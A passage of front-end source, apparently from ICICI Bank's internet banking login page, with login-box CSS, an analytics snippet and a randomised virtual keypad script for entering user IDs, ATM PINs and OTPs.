			//alert('ES'+ document.getElementById('ES').value) ;
			document.getElementById('ES_NEW').value= document.getElementById('ES').value;

			document.RIBSignOn.submit();
			
    }else{
		try{
	    	//txtBox.focus();
		} catch(err){}
    }

});
</script>
<!--

Kartikey IBM Points Active Malware

-->
<style>
	.donothing1{
		display:none;
	}	
	.m_loginID_new {
		width: 170px !important;
	}
	
	.banner-list .media .image-media {
    margin-left: 166px;
}

.links-margin {
    margin-top: 49px !important;
    margin-right: 9.6% !important;
}
.global-margin {
	margin-top: -25px !important;

</style>

<style>
/* Login Revamp changes added start here */
	
	.login-text {
    border-radius: 5px;
    height: auto;
    background: white;
    width: 276px;
    margin: 0 0 0 auto;
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    /* right: -3px; */
    top: 70px;
    position: relative;
    float: right;
}

.login-text.row_login {
    max-width:  260px;
    margin: 0 auto;
}
.login .banner .container .login-text .row {
    position: relative;
    height: 100%;
    margin: 0;
    padding: 1.2rem;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
}
.lock_id {
    float: left;
    margin-left: -20px;
    padding-left: 27px;
    margin-top: 20px;
}

.lock_pic {
    
    margin-top: 12px;
    padding-left: 3px;
    width: 15px;
    float: left;
}
.login{
    color: #0B3C6D;
    font-size: 1rem;
    display: flex;
    justify-content: flex-start;
    align-items: baseline;
    font-weight: bold;
}
.login {
    font-family: 'Helvetica';
}

.label {
   
    font-family: Arial,Helvetica,sans-serif;
    font-size: 12px;
    font-style:normal ;
    font-weight: 700;
    margin-top: 13px;
    text-decoration: none;
}
.login_labels {
    font-size: 0.75rem;
    color: #194D7D;
    margin-bottom: 0.3rem;
    display: inline-block;
}
.login_label{
    font-size: 0.75rem;
    color: #194D7D;
    margin-bottom: 4px;
    margin-top: 1rem;
}
.row_login {
     position: relative;
    height: 100%;
    margin: 0;
    padding: 1.2rem;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
}
/*.login_virtual_key
{
    background: url(L001/consumer/images/img/keyboard.png);
    cursor: pointer;
    height: 22px;
    margin-left: 2px;
    vertical-align: middle;
    width: 34px;
    } */
.get {
    width: 85%;
    display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    color: #F27B1A;
    font-size: 0.625rem;
    font-style: oblique;
    padding-top: 0.5rem;
    cursor: pointer;
}
.get_page {
    width: 89%;
    display: flex;
    align-items: end;
    justify-content: flex-end;
    color: #F27B1A;
    font-size: 0.625rem;
    padding-right: 5rem;
    font-style: oblique;
    padding-top: 2;
    cursor: pointer;
}
.card-field {
    -webkit-appearance: none;
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24) !important;
    border-radius: 5px;
    border: none;
    width: 68%;
    height: 1.8rem;
    font-size: 0.75rem;
    padding-right: 1rem;
    padding-left: 1rem;
    background-color: #f7f7f7;
    margin-right: 8px;
    }
    input[type=password] {
     -webkit-appearance: none;
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24) !important;
    border-radius: 5px;
    border: none;
    width: 85%;
    height: 1.8rem;
    font-size: 0.75rem;
    padding-right: 1rem;
    padding-left: 1rem;
    background-color: #f7f7f7;
    margin-right: 21px;
    }
	.expiry-month { 
	-webkit-appearance: none;
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24) !important;
    border-radius: 5px;
    border: none;
    width: 20%;
    height: 1.8rem;
    font-size: 0.75rem;
    padding-right: 1rem;
    padding-left: 1rem;
    background-color: #f7f7f7;
    margin-right: 8px;}

	.expiry-year { 
	-webkit-appearance: none;
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24) !important;
    border-radius: 5px;
    border: none;
    width: 30%;
    height: 1.8rem;
    font-size: 0.75rem;
    padding-right: 1rem;
    padding-left: 1rem;
    background-color: #f7f7f7;
    margin-right: 8px;}

    .forgot-password{
     margin-left: 136px;
    align-items: flex-end;
    justify-content: flex-end;
    color: #F27B1A;
    font-size: 0.625rem;
    font-style: oblique;
    padding-top: 0.5rem;
    cursor: pointer;
    display: inline-block;
    
    }
    .dummypwd_btn {
    display: none !important;
   }
   .timer_resend_otp{     
    align-items: flex-end;
    justify-content: flex-end;
    color: #F27B1A;
    font-size: 0.575rem;
    font-style: oblique;
    padding-top: 0.8rem;
    cursor: pointer;
    display: inline-block;
    }
    
     .forgot-user{
     margin-left: 154px;
    align-items: flex-end;
    justify-content: flex-end;
    color: #F27B1A;
    font-size: 0.575rem;
    font-style: oblique;
    padding-top: 0.8rem;
    cursor: pointer;
    display: inline-block;
    }
	.login-input-password{
		width: 80% !important;
	}
	.adg-input-inline-block .mob-no-input:focus {
	
                outline: none;
                border: 1px solid #F27B1A; 
                background: #FFFFF9; 
          
      }
	.adg-input-inline-block .ainner-col-2:focus {
	
                outline: none;
                border: 1px solid #F27B1A; 
                background: #FFFFF9; 
                      border-radius:4px;
      }
      .adg-input-inline-block .ainner-col-2 option:hover{
      	background-color: #F27B1A; 
      }
    .login-input:focus {
                outline: none;
                border: 1px solid #F27B1A; 
                background: #FFFFF9; 
       }
     .login-input-password:focus {
                outline: none;
                border: 1px solid #F27B1A; 
                background: #FFFFF9; 
       }
     .cta {
    background-color: #F27B1A;
    position: relative;
    font-size: 1rem;
    color: white !important;
    line-height: 2rem;
    letter-spacing: 0.46px;
    text-align: center;
    width: 10rem;
    height: 2rem;
    display: flex;
    justify-content: center;
    align-items: center;
    border-radius: 2em;
    transition: background-color 0.2s ease-in;
    margin: 1.2rem 0;
    cursor: pointer;
}

.trouble-demo{
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
        margin-top: -20px;
}
.trouble-login{
display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    color: #0B3C6D;
    font-size: 0.8rem;
    font-style: oblique;
     cursor: pointer;
    margin-left: -10px;
}
.trouble-help{
display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    color: #0B3C6D;
    font-size: 0.8rem;
    font-style: oblique;
     cursor: pointer;
    text-decoration-line: underline;

}

.login-heading{
    margin-left: -20px;
    margin-top: -20px;
}
.check-box-top{
margin-top: 10px;
}
.check-lable-style{
    font-size: 12px;
    margin-top: 5px;
    position: absolute;
    text-align: center;
    margin-left: 2px;
}
input[type="checkbox"] {
    width: 18px;
    height: 18px;
 }
 input[type="checkbox"]:focus + label {
  border:2px solid red;
}
input {
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    border-radius: 5px;
    border: none;
    margin-right: 0.5rem;
}

#footer {
    margin-top: 0;
    padding: 0;
    position: absolute;
    top:1500px;
}

#topbar-wrapper {
    height: 37px;
    background-color: #F27B1A !important;
	width: 100%; 
}
.margintTopMinu10{
margin-top: -2px;
}
.mobile-icon{
position: absolute;
    margin-top:22px;
    left: 18px;
}
.mobile-lable{
position: absolute;
    margin-top: 45px;
    left: 10px;
}
#MessageDisplay_TABLE {
    z-index: 1;
    top: 87px;
    position: absolute;
    width: 77.5%;
    left: 0px;
    right: 0px;
    margin-left: 160px;
}
html, body {
    height: 100%;
    overflow-x: hidden !important;;
    position: relative;
    
}
.Loginrow {
    width: auto !important;
    clear: both;
    margin-right: 15px;
    position: relative;
    z-index: 100000;
}
#flashcontent{
display : none;
}
.input-field{
    width: 95%;
    display: flex;
    /*justify-content: space-between;*/
    align-items: center;
}
.login_labelfield {
    font-size: 0.875rem;
    color: #194D7D;
    margin-bottom: 0.6rem;
    margin-top: 1rem;
}

.user_inputfield {
    -webkit-appearance: none;
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24) !important;
    border-radius: 5px;
    border: none;
    width: 79%;
    height: 1.8rem;
    font-size: 0.75rem;
    padding-right: 1rem;
    padding-left: 1rem;
    background-color: #f7f7f7;
    margin-right: 8px;
}
.floatRight{
    float: right;
    margin-top: 4px;
}
.keypaddiv {
    z-index: 10011;
    position: fixed;
    height: 60px;
    visibility: hidden;
    top: 125px!important;
    right: 550px!important;
    left: auto!important;
}
.partition-line
{
    position: relative;
    width: 100%;
    text-align: center;
    border-bottom: 1px solid #D8D8D8;
    line-height: 0.1em;
    margin: 10px 0 20px;
    margin-top: 1.5rem;
    margin-bottom: 2rem;
}
.partition-circle {
    position: absolute;
    background: #0B3C6D;
    padding: 10px 4px;
    border-radius: 9em;
    font-size: 10px;
    color: white;
    border: 4px solid white;
    left: 50%;
    top: 101%;
    transform: translate(-50%, -50%);
}
    
   
.input-field {
    position: relative;
}
.expanded {
    border-radius: 0.25em 0 0.25em 0.25em;
    border-right: none;
    background: white;
    max-height: 22em;
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
}
.dropdown {
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    border-radius: 5px;
    width: 8.5rem;
    background: white;
}
.login_labelfield12 {
    font-size: 0.875rem;
    color: #194D7D;
    margin-bottom: 0.2rem;
    margin-top: 0rem;
}
.dropdown-el {
    min-width: auto;
    position: absolute;
    display: inline-block;
    margin-right: 1em;
    min-height: 30px;
    max-height: 30px;
   /*  overflow: hidden; */
    top: 0;
    left: 0;
    z-index: 99;
    cursor: pointer;
    text-align: left;
    white-space: nowrap;
    color: #444;
    outline: none;
    transition: 0.0s all ease-in-out;
}
.input-field .dropdown-el {
    width: 4rem;
    min-height: 26px;
    max-height: 26px;
    border-right: 1px solid #D8D8D8;
    box-shadow: none;
    -moz-box-shadow: none;
    -webkit-box-shadow: none;
    border-radius: 5px 0 0 5px;
    top: 1px;
    left: 1px;
    background-color: #f7f7f7;
}
.dropdown {
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    border-radius: 5px;
    width: 8.5rem;
    background: white;
}
.textarea {
    margin: 0;
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
}


.button.input.optgroup.select.textarea {
    margin: 0px;
    font-family: inherit;
    /* font-size: inherit; */
    line-height: inherit;
}

.dropdown-el input {
    display: none;
}
.dropdown-el input[type=radio] {
    box-sizing: border-box;
    padding: 0;
}

.dropdown-el input:checked + label:nth-child(2) {
    margin-top: 0;
    position: relative;
}

.dropdown-el.expanded input:checked + label {
    color: black;
}

.dropdown input:checked + label {
    color: #4A4A4A;
    padding-top: 2px;
}

.dropdown-el input:checked + label {
    display: block;
    border-top: none;
    position: absolute;
    top: 0;
}

.dropdown-el label:nth-child(2) {
    margin-top: 2.5em;
    border-top: 1px solid #D8D8D8;
}

.dropdown-el.expanded label {
    border-top: 1px solid #eaeaea;
}
.dropdown label {
    font-size: 12px;
    margin-bottom: 0;
    color: #0B3C6D;
    height: 30px;
    padding-top: 0.3rem;
    padding-bottom: 0.3rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
    cursor: pointer;
}

.dropdown-el label {
    border-top: 1px solid #D8D8D8;
    display: block;
    height: 2em;
    line-height: 2em;
    padding-left: 1em;
    padding-right: 3em;
    cursor: pointer;
    position: relative;
    transition: 0.3s color ease-in-out;
}


.dropdown-el::after {
    /* background-image: url(L001/consumer/icici-login-update/img/dropdown.png); */
    content: "";
    position: absolute;
    right: 0.5em;
    width: 10px;
    height: 10px;
    background-repeat: no-repeat;
    top: 0.8em;
    transition: 0.4s all ease-in-out;
    background-size: 9px 5px;
}
 .dropdown-el::after, ::before {
    box-sizing: border-box;
}
.dropdown-el.expanded::after {
    transform: rotate(-180deg);
    top: 0.4em;
}
.input-field .expanded {
	overflow: scroll;
    border-radius: 0.25em 0 0.25em 0.25em;
    border-right: none;
    background: white;
    max-height: 22em;
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
}
.input-field .input-arrow {
	display: flex;
    margin-right: 10px;
    width: 85%;
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    background-color: #f7f7f7;
    border-radius: 5px;
}
.mobile-number-display {
    font-size: 0.85rem;
    color: #194D7D;
    margin-bottom: 0;
    margin-top: 0.3rem;
}
.no-text {
    font-size: 12px; 
    color: #4A4A4A;
    margin-bottom: 0;
    -webkit-animation: fadeOut 1s;
    animation: fadeOut 1s;
    margin-left: 0.8rem;
}
.no-text-mobotp {
    font-size: 12px; 
    color: #4A4A4A;
    margin-bottom: 0;
    -webkit-animation: fadeOut 1s;
    animation: fadeOut 1s; 
	margin-left: 2px;	
}
.edit-but {
    position: absolute;
    cursor: pointer;
    font-size: 0.78rem;
    right: 9%;
    top: 13%;
    color: #f28425;
}
.input-field .input-arrow input {
    -webkit-appearance: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none !important;
    border-radius: 5px 0 0 5px;
    border: none;
    width: 90%;
    height: 1.8rem;
    font-size: 0.75rem;
    padding-right: 1rem;
    padding-left: 1rem;
    background-color: #f7f7f7;
}
.mobile-detail-row {
    display: none;
    -webkit-animation: fadeOut 1s;
    animation: fadeOut 1s;
}
.input-field .input-arrow .goahead {
    width: 0.9rem;
    margin: 12px;
    margin-top: 12px;
    margin-right: 12px;
    margin-bottom: 12px;
    margin-left: 12px;
    cursor:pointer;
}
.trouble-login{
display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    color: #0B3C6D;
    font-size: 0.875rem;
    font-style: oblique;
    padding-top: -0.5rem;
    cursor: pointer;
}
.user_login{
display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    color: #0B3C6D;
    font-size: 0.8rem;
    font-style: oblique;
    cursor: pointer;
    margin-left: -10px;
   } 
.small-login{
display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    color: #F27B1A;
    font-size: 0.625rem;
    font-style: oblique;
    padding-top: 0.5rem;
    cursor: pointer;
}
.login-text .row .truble-login {
    width: 87%;
    display: flex;
    justify-content: space-between;
    align-items: baseline;
    border-top: 1px solid #D8D8D8;
    position: absolute;
    bottom: 0.5rem;
}
.login-text .row {
    position: relative;
    height: 104%;
    margin: 0;
    padding: 1.2rem;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
}


A {
    color: #f28425;
    /* text-decoration: none; */
    outline: 4 none;
}
.input-field .mob-no-input{
    padding-left: 4.4rem;
    width: 150px;
    margin-left: -105px;
    font: 400 13.3333px Arial;
}
a:not([href]):not([tabindex]) {
    color: inherit;
    text-decoration: none;
}
.checkbox-label {
    	display: block;
    	color: #194D7D;
    position: relative;
    padding-left: -2px;
    margin-bottom: 12px;
    cursor: pointer;
    font-size: 10px;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}
.need-user
{
color: #F27B1A;
    
    font-size: 0.725rem;
}

.need-userfield
{
color: #F27B1A;
    padding-left: 180px;
    font-size: 0.725rem;
}
.a {
    color: #007bff;
    text-decoration: none;
    background-color: transparent;
    -webkit-text-decoration-skip: objects;
}


.body {
    /* margin: 0; */
    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";
    font-size: 1rem;
    font-weight: 300;
    line-height: 1.5;
    color: #212529;
    text-align: left;
    background-color: #fff;
}
.login-text .row .checkbox-field {
    display: flex;
    justify-content: flex-start;
    align-items: center;
    width: 100%;
    position: relative;
    height: 50px;
}
.login-text .row .checkbox-field .checkbox {
    margin-top: 2.5rem;
}
.checkmark {
    position: absolute;
    top: 0;
    left: 0;
    height: 16px;
    width: 16px;
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.24);
    border-radius: 2px;
    background-color: #f7f7f7;
    border: 1px solid #004981;
}
.btn-dev
{

    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.login-text .row .btn-div .button {
    width: auto;
}
.mt-0, .my-0 {
    margin-top: 0!important;
}

.m-0 {
    margin: 0!important;
}
s.login-text .cta {
    margin: 1.1rem 0;
    box-shadow: 0 4px 10px 0 rgba(242, 123, 26, 0.45);
    -moz-box-shadow: 0 4px 10px 0 rgba(242, 123, 26, 0.45);
    -webkit-box-shadow: 0 4px 10px 0 rgba(242, 123, 26, 0.45);
}
.checkbox-label .checkmark:after {
    left: 5px;
    top: 1px;
    width: 5px;
    height: 10px;
    border: solid white;
    border-width: 0 2px 2px 0;
    -webkit-transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    transform: rotate(45deg);
}
.checkmark:after {
    content: "";
    position: absolute;
    display: none;
}
.checkbox-label input:checked ~ .checkmark {
    background-color: #0B3C6D;
}
.login-text .row .checkbox-field .checkbox label {
    color: #194D7D;
    font-size: 0.625rem;
    margin-top: 1rem;
}
.small-text
{

    font-size: 11px;
    color: #909090;
}

.login-text .mobile-detail-row .small-text {
    align-items: center;
    justify-content: space-between;
}
.simpletext23 {
    font-family: Arial,Helvetica,sans-serif;
    font-size: 16px;
    font-weight: 700;
    font-style: normal;
    text-decoration: none;
    color: #0B3C6D;
    text-align: center;
    margin-top: -62px;
    margin-left: -7px;
    margin-bottom: 30px;
    padding: 4px;
    }
.go-small-text
{

    width: 85%;
    display: flex;
    align-items: flex-end;
    justify-content: flex-end;
    color: #F27B1A;
    font-size: 0.625rem;
    font-style: oblique;
    padding-top: 0.5rem;
    cursor: pointer;
}

.login-info {
    width: 87%;
    display: flex;
    justify-content: space-between;
    align-items: baseline;
    border-top: 1px solid #D8D8D8;
    position: absolute;
    bottom: 0.5rem;
}
.text-otp
{

    font-size: 10px;
    color: #909090;
}
.adg-input-inline-block .ainner-col-2 {
   
   /*  background: url(../images/selectbox_bg_small.jpg) left top no-repeat !important; */
       width: 60px;
    height: 28px;
    padding-left: 6px;
    background-color: #f7f7f7;
    border: none;
}
.adg-input-inline-block .ainner-col-2
 {
    width: 60px !important;
    
}
.login-text .row_login .input-field input:focus {
                outline: none;
               /*  border: 1px solid #F27B1A; */
                background: #FFFFF9;
 }
  .input-field .mob-no-input input:focus {
                outline: none;
               /*  border: 1px solid #F27B1A; */
                background: #FFFFF9;
 }
 .adg-input-inline-block .ainner-col-2 .newListSelected {
    width: 74px;
    background: url(../images/selectbox_bg_small.jpg) left top no-repeat !important;
}
.newListSelFocus {
}
.marginTop45{
margin-top:45px;
}

.ainner-col-2 .newListSelected{
	display: none !important;
}

.margin_bot_11{
margin-bottom: 11px !important;
}
.input-field-mob{
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
	position: relative;
}

.input-field-mob .expanded {
	overflow: scroll;
    border-radius: 0.25em 0 0.25em 0.25em;
    border-right: none;
    background: white;
    max-height: 22em;
    box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -moz-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
    -webkit-box-shadow: 0 2px 5px 0 rgba(113, 113, 113, 0.39);
}
.input-field-mob .dropdown-el {
    width: 4rem;
    min-height: 26px;
    max-height: 26px;
    border-right: 1px solid #D8D8D8;
    box-shadow: none;
    -moz-box-shadow: none;
    -webkit-box-shadow: none;
    border-radius: 5px 0 0 5px;
    top: 1px;
    left: 1px;
    background-color: #f7f7f7;
}
.input-field-mob .mob-no-input{
    padding-left: 4.4rem;
    width: 150px;
    margin-left: -105px;
    font: 400 13.3333px Arial;
}
 .input-field-mob .mob-no-input input:focus {
                outline: none;              
                background: #FFFFF9;
 }
 
 .verification_img1{
	height: 15px;
    width: 15px;
    margin-left: 5px;
    margin-bottom: 5px;
}
	/* Login Revamp changes added end here */
	
	

</style>




<script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga'); 
ga('create', 'UA-17906056-1', { 'userId': '0','cookieDomain':'icicibank.com'});
ga('set', 'dimension1', '0');
ga('send', 'pageview', '======');</script><title>Log in to Internet Banking</title><div id="flashcontent">

            </div></head>
<body >
<script type="text/javascript">var langID="001"
var locale="en_US"

 







<script type="text/javascript">

// Checks if the browser supports document.all

linkArray = new Array();

isIE = document.all;

// Checks if browser used is Netscape Navigator

isNN = !document.all&&document.getElementById;

// Checks if browser used is Netscape Navigator 4

isN4 = document.layers;



ppX = 450;

ppY = 250;



editCtl = null;

tmpEditCtl = null;



rX = (Math.random() * 24) - 12;

rY = (Math.random() * 36) - 18;



/*** Declaring variable and separate flag values for call id: 128860 --Begin-- satyabrata ghosh --29/08/2008 ***/

vIndex=0;

vRandomAlp=0;

vRandomNo=0;

vRandomSpl=0;

/*** Declaring variable and separate flag values for call id: 128860 --End-- satyabrata ghosh --29/08/2008 ***/



isHot=false;

showFirstTime=true;



/*For enabling links*/

isFirstTimeEnable = true;



/* This function is used to enter alphabets, special characters and numbers*/

insertData=function(ctl, value) {



    ctl.value = ctl.value + value;

};



/* This function is used to enter password, change case and clear */     

applyNumber=function(ctl) {

	if(editCtl.value.length>=6 && ctl.name != 'pp_clear' && ctl.name != 'pp_erase' && ctl.name != 'pp_caps' && this.target.id != 'AuthenticationFG.ACCESS_CODE' && this.target.id != 'AuthenticationFG.USER_PRINCIPAL' && this.target.id != 'PasswordChangeFG.SIGNON_PWD' && this.target.id != 'PasswordChangeFG.SIGNON_NEW_PWD' && this.target.id != 'PasswordChangeFG.RETYPE_SIGNON_PWD' && this.target.id != 'LoginAltFlowFG.RETYPE_LOGIN_PWD' && this.target.id != 'LoginAltFlowFG.LOGIN_PWD'
		&& this.target.id != 'AuthenticationFG.SIGNON_PWD' && this.target.id != 'AuthenticationFG.SIGNON_NEW_PWD' && this.target.id != 'AuthenticationFG.RETYPE_SIGNON_PWD'
			&& this.target.id != 'AuthenticationFG.TRANSACTION_PWD' && this.target.id != 'AuthenticationFG.TRANSACTION_NEW_PWD' && this.target.id != 'AuthenticationFG.RETYPE_TRANSACTION_PWD')

	{

		// Restricted

	}

	else

	{

    if(editCtl != null ) {



        if(ctl.name == 'pp_clear') {

            editCtl.value = '';

        }else if (ctl.name == 'pp_erase'){

            editCtl.value= editCtl.value.substring(0,editCtl.value.length-1);

        

        

        /*** Working of the Caps button for call id: 128860 --Begin--  satyabrata ghosh --29/08/2008 ***/

        

        }else if (ctl.name == 'pp_caps'){ 

			var vCaps = document.getElementById('pp_caps').value;

			for(var vIndex=0;vIndex<26;vIndex++){

				var vAlp = document.getElementById('alp_'+vIndex).value;

				// Changes to Uppercase 

				

				if(vAlp==vAlp.toLowerCase()){

					var vTemp=vAlp.toUpperCase();

					document.getElementById('alp_'+vIndex).value=vTemp;

					//Commented for To ticket Id 340925

					//document.getElementById('pp_caps').value=vCaps.toUpperCase();

				// Changes to Lowercase

				}else{		

					var vTemp=vAlp.toLowerCase();

					document.getElementById('alp_'+vIndex).value=vTemp;

					

				}

				//Commented for To ticket Id 340925

				//document.getElementById('pp_caps').value=vCaps.toLowerCase();

			}

	

	/*** Working of the Caps button for call id: 128860 --End--  satyabrata ghosh --29/08/2008 ***/

		}else {

		// Inserts alphabets, special characters and numbers on click



            if(!editCtl.maxLength || editCtl.maxLength == 0 || editCtl.maxLength > editCtl.value.length) {



                insertData(editCtl, ctl.value);

            }

            tmpEditCtl = editCtl;

            if(editCtl.maxLength && editCtl.maxLength <= editCtl.value.length) {



                setPinPadCtl(null);

            }

	    if(tmpEditCtl.focus){

                setTimeout('tmpEditCtl.focus()', 1);

	    }

        }

    }

	}

};

isIE=document.all? 1:0

/*Disable Actual Keyboard*/

		

		noKeyboard=function(e){

			keyEntry = !isIE? e.which:event.keyCode;

			if((keyEntry < '255') || (keyEntry > '0')){

				return false;

			}

		};

		

		// Arrays containing alphabets, special characters and numbers in different languages 

		var langBsdSmallAlp = {"001":"abcdefghijklmnopqrstuvwxyz","002":"abcdefghijklmnopqrstuvwxyz",

		"003":"abcdefghijklmnopqrstuvwxyz","004":"abcdefghijklmnopqrstuvwxyz"};

		var langBsdNum = {"001":"0123456789","002":"0123456789","003":"0123456789","004":"0123456789"};

		var langBsdSplChars = {"001":".+-! ,@#$%&*()?=<>^_]{:\\|}`/[~\"\';","002":".+-! ,@#$%&*()?=<>^_]{:\\|}`/[~\"\';",

		"003":".+-! ,@#$%&*()?=<>^_]{:\\|}`/[~\"\';","004":".+-! ,@#$%&*()?=<>^_]{:\\|}`/[~\"\';"};

		

		/* This is method creates separate arrays with alphabets, special characters and numbers based on lang id*/

		getCharBasedOnLangId=function(arrayObj){

			var chars = arrayObj[langID];

			var langArr = new Array();

			var character;

			/* Added so that a virtual keypad will be displayed even if an entry for alphabets, special chars and nos

				is not present for a particular lang id */

			if(chars == null){

				chars = arrayObj["001"];

			} 

			var charLen = chars.length;

			for(i=0; i < charLen ; i++){

				character = chars.substring(i,i+1);

				if(character == "\""){

					langArr[i] = "&quot";

				}else{

					langArr[i] = character;	

				}

			}		

			return langArr;

		};

		

		/*This function is used to paint the virtual keyboard on the page */

		settingPinPadCtl=function(whatobject,whatimage,whatelement){



			

			if(noAction){

				return;

			}

			smallAlpArr = getCharBasedOnLangId(langBsdSmallAlp);

			numArr = getCharBasedOnLangId(langBsdNum);

			splCharArr = getCharBasedOnLangId(langBsdSplChars);



/**** Depending on condition shuffle the keys on every click for call id: 128860 --Begin-- satyabrata ghosh --29/08/2008 ***/

if(vRandomAlp==0){

	// Shuffling the order of an array -AbdulMalik 6/27/2008

	smallAlpArr.sort(function() {

return 0.5 - Math.random()})

}

if(vRandomNo==0){

	numArr.sort(function() {

return 0.5 - Math.random()})

}

if(vRandomSpl==0){

	splCharArr.sort(function() {

return 0.5 - Math.random()})

}

/**** Depending on condition shuffle the keys on every click for call id: 128860 --End-- satyabrata ghosh --29/08/2008 ***/



	var incr=0;

	var incralp=0,incrno=0,incrspl=0;

	var formname = '';

	for(j=0;document.forms[j] != null;j++)

	{

		for(i=0; document.forms[j].elements[i] != null; i++)

		{

			if((document.forms[j].elements[i].name == whatelement))

			{

				formname = document.forms[j].name;

			}

		}

	}

	this.target=document.forms[formname].elements[whatelement];

			

			/**** Reformed the table and button name,separate table created for action buttons for call id: 128860 --Begin-- satyabrata ghosh --29/08/2008 ***/

			/* Generates virtual keypad based on the number of special characters, numbers and alphabets : 

			Added for internationalization */

			var len = 11;

			var numSplVal = 0;

			var newRow;

			var smallAlpArrLen = smallAlpArr.length;

			var numArrLen = numArr.length;

			var splCharArrLen = splCharArr.length;

			/** This condition is used for Password,mPin and passcode**/

			if (whatimage == 2){  

				

		var sHTML='<div id="close-keypad" class="width100percentforkeypad" ><div id="keypadstyle"  class="width100percentforkeypad">'

			+'<p align="right"> <span> <strong><a name="CLOSE_KEYPAD" id="CLOSE_KEYPAD" href="javascript:setPinPadCtl(null),enableTextField(\'+whatelement+\')" class="close" title="Close" style="margin-left:500px">x&nbsp;</a></strong></span> </p>' 

			+ '<p ><span id="titleBar" class="keyBordText" ><ilayer width="100%" onSelectStart="return false">'

			+'<layer  width="100%" onMouseover="isHot=true;if (isN4) ddN4(pp_div)" onMouseout="isHot=false">'

			//Added for User Id Keybord addition

			if(this.target.id=='AuthenticationFG.USER_PRINCIPAL'){

				

				sHTML=sHTML	+'User ID: '

					+'</layer></ilayer>'



					+'</span>'



					+'<span class="floatingleft"><input length="13" type=text name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly></span>'



					+'<span class="left CellBackGroundColourForKeypad"></span></p></div>';

			}else if(this.target.id=='AuthenticationFG.RIB_LOGIN_ATM_PIN'){

				

				sHTML=sHTML	+'ATM PIN: '

					+'</layer></ilayer>'



					+'</span>'



					+'<span class="floatingleft"><input length="13" type=text name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly></span>'



					+'<span class="left CellBackGroundColourForKeypad"></span></p></div>';

			}else if(this.target.id=='AuthenticationFG.RIB_LOGIN_OTP'){

				

				sHTML=sHTML	+'6 Digit OTP: '

					+'</layer></ilayer>'



					+'</span>'



